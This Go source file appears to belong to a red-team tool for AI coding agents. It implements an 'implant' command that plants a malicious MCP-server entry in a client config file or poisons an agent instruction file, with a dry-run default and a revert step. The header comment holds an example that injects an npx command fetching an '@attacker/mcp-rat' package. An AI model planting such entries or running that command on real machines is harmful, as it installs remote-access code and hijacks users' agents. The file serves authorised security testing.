// Package cli — implant.go is the v0.4 entry point for the destructive
// implant action.
//
// Same safety gates as poison.go: Reverter mandatory, --commit=false
// default, AUTHORIZED prompt + ~/.agenthound/poison-acknowledged
// sentinel (shared with poison; the operator confirms once for all
// destructive primitives), receipt persistence before "applied"
// success report.
//
// CLI shape:
//
//	agenthound implant <host-or-N/A> --type mcp.config.malicious-server \
//	    --file ~/.cursor/mcp.json \
//	    --inject '{"command":"npx","args":["-y","@attacker/mcp-rat"]}' \
//	    --commit \
//	    --engagement-id DC35-DEMO
//
// The <host> argument is informational for file-based Implanters
// (instruction.poison treats it the same way) — it is recorded on the
// receipt's Target so an operator can correlate the implanted machine
// with the engagement, but the actual modification is local-filesystem
// only.
package cli

import (
	"context"
	"errors"
	"fmt"
	"log/slog"
	"os"

	"github.com/spf13/cobra"
	"github.com/spf13/pflag"

	"github.com/adithyan-ak/agenthound/sdk/action"
	"github.com/adithyan-ak/agenthound/sdk/module"
)

var implantCmd = &cobra.Command{
	Use:   "implant <host>",
	Short: "Plant persistence in instruction or config files (Reverter mandatory)",
	Long: `Run a registered Implanter against a known target.

Implanters install persistence — a malicious MCP-server entry in a
client's config file, a sentinel-bracketed block in an instruction
file. Every Implanter embeds Reverter; receipts are persisted to
~/.agenthound/state/<module-id>/<engagement-id>.json.

By default --commit is OFF. Without --commit the Implanter runs end-
to-end with no mutating writes; the receipt records dry_run=true.

See docs/poison.md for the shared safety-gate rationale.`,
	Args:          cobra.ExactArgs(1),
	RunE:          runImplant,
	SilenceUsage:  true,
	SilenceErrors: false,
}

func init() {
	implantCmd.Flags().String("type", "", "Implanter target kind (e.g. 'mcp.config.malicious-server', 'instruction.file'). Required.")
	implantCmd.Flags().String("target-id", "", "Per-module logical address (often the absolute file path).")
	implantCmd.Flags().String("inject", "", "Injection content (JSON for config implants; freeform for instruction-file).")
	implantCmd.Flags().String("inject-file", "", "Read injection content from this file (overrides --inject if both set).")
	implantCmd.Flags().Bool("commit", false, "Issue the mutating file write. Default: dry-run.")
	implantCmd.Flags().String("engagement-id", "", "Engagement identifier. Required so 'agenthound revert' can locate the receipt.")
	if err := implantCmd.MarkFlagRequired("type"); err != nil {
		panic(err)
	}
	if err := implantCmd.MarkFlagRequired("engagement-id"); err != nil {
		panic(err)
	}

	for _, mod := range module.ListByAction(action.Implant) {
		module.RegisterFlagsFor(implantCmd, mod)
	}
	for _, mod := range module.ListByAction(action.Poison) {
		// Surface every Poisoner that targets a kind the operator might
		// type after `agenthound implant --type` — instruction.file is
		// the canonical example. runImplant falls back to action.Poison
		// dispatch when no Implanter matches the requested target kind,
		// so the per-module flags must be visible on `implant --help`
		// too. Use registerFlagsAvoidingDupes because Implanter and
		// Poisoner flag sets overlap (e.g. both modules use --file).
		registerFlagsAvoidingDupes(implantCmd, mod)
	}

	rootCmd.AddCommand(implantCmd)
}

// registerFlagsAvoidingDupes wires a module's per-module flags onto cmd,
// silently skipping any whose name is already defined. pflag panics on
// duplicate flag names, and the implant command surfaces both Implanter
// and Poisoner flag sets so legitimate name overlap (e.g. --file used
// by mcpconfigimplant AND instructionpoison) must not crash init().
func registerFlagsAvoidingDupes(cmd *cobra.Command, m module.Module) {
	fm, ok := m.(module.FlagsModule)
	if !ok {
		return
	}
	probe := pflag.NewFlagSet("implant-dedup-probe", pflag.ContinueOnError)
	fm.RegisterFlags(probe)
	probe.VisitAll(func(f *pflag.Flag) {
		if cmd.Flags().Lookup(f.Name) != nil {
			return
		}
		cmd.Flags().AddFlag(f)
	})
}

func runImplant(cmd *cobra.Command, args []string) error {
	target := args[0]
	kind, _ := cmd.Flags().GetString("type")
	targetID, _ := cmd.Flags().GetString("target-id")
	injection, _ := cmd.Flags().GetString("inject")
	injectFile, _ := cmd.Flags().GetString("inject-file")
	commit, _ := cmd.Flags().GetBool("commit")
	engagementID, _ := cmd.Flags().GetString("engagement-id")

	if injectFile != "" {
		data, err := os.ReadFile(injectFile)
		if err != nil {
			return fmt.Errorf("--inject-file %s: %w", injectFile, err)
		}
		injection = string(data)
	}
	if injection == "" {
		return errors.New("implant: --inject or --inject-file is required")
	}

	if err := requirePoisonAcknowledged(cmd.OutOrStderr(), cmd.InOrStdin()); err != nil {
		return err
	}

	mod, ok := module.GetByTarget(kind, action.Implant)
	if !ok {
		// Fall back to a Poisoner with the same target kind. The docs
		// expose `--type instruction.file` under `agenthound implant`
		// for operator ergonomics, but instructionpoison registers as
		// a Poisoner (it modifies content the agent consumes, which is
		// the Poisoner contract). The dispatch was previously broken:
		// runImplant looked up only Implanters and returned an error
		// for any Poisoner-backed type. We now hand off to the shared
		// poison runner with label="implant" so the operator-facing
		// output still says [implant] but the safety gates, receipt
		// handling, and revert path all match the Poisoner contract.
		if poisonMod, poisonOk := module.GetByTarget(kind, action.Poison); poisonOk {
			if _, isPoisoner := poisonMod.(action.Poisoner); isPoisoner {
				return runPoisonDispatch(cmd, args, "implant")
			}
		}
		return fmt.Errorf("no implanter registered for --type %q", kind)
	}
	implanter, ok := mod.(action.Implanter)
	if !ok {
		return fmt.Errorf("registered module %q is not an Implanter", mod.ID())
	}
	stateful, ok := mod.(interface {
		Stateful() module.StatefulModule
	})
	if !ok {
		return fmt.Errorf("registered implanter %q does not expose StatefulModule", mod.ID())
	}

	extras := collectModuleExtras(cmd, mod)

	ctx := context.Background()
	receipt, err := implanter.Implant(ctx, action.Target{
		Kind:    "host",
		Address: target,
	}, action.ImplantPayload{
		InjectionContent: injection,
		TargetID:         targetID,
		EngagementID:     engagementID,
		DryRun:           !commit,
		Extras:           extras,
	})
	if err != nil {
		return fmt.Errorf("implant: %w", err)
	}

	state := stateful.Stateful()
	path := receiptPath(state, engagementID)
	if commit {
		if _, statErr := os.Stat(path); statErr != nil {
			return fmt.Errorf("implant applied but pre-mutation receipt is missing: %w", statErr)
		}
	} else {
		var werr error
		path, werr = state.WriteReceipt(engagementID, receipt)
		if werr != nil {
			slog.Error("implant: dry-run receipt persistence failed",
				"module", mod.ID(),
				"engagement_id", engagementID,
				"target_id", targetID,
				"error", werr)
			return fmt.Errorf("implant dry-run receipt persistence failed: %w", werr)
		}
	}

	if commit {
		_, _ = fmt.Fprintf(cmd.OutOrStderr(),
			"[implant] APPLIED %s %s — engagement_id=%s receipt=%s\n",
			kind, target, engagementID, path)
		_, _ = fmt.Fprintf(cmd.OutOrStderr(),
			"[implant] revert with: agenthound revert %s\n", engagementID)
	} else {
		_, _ = fmt.Fprintf(cmd.OutOrStderr(),
			"[implant] DRY-RUN %s %s — engagement_id=%s receipt=%s\n",
			kind, target, engagementID, path)
		_, _ = fmt.Fprintf(cmd.OutOrStderr(),
			"[implant] re-run with --commit to apply.\n")
	}
	return nil
}
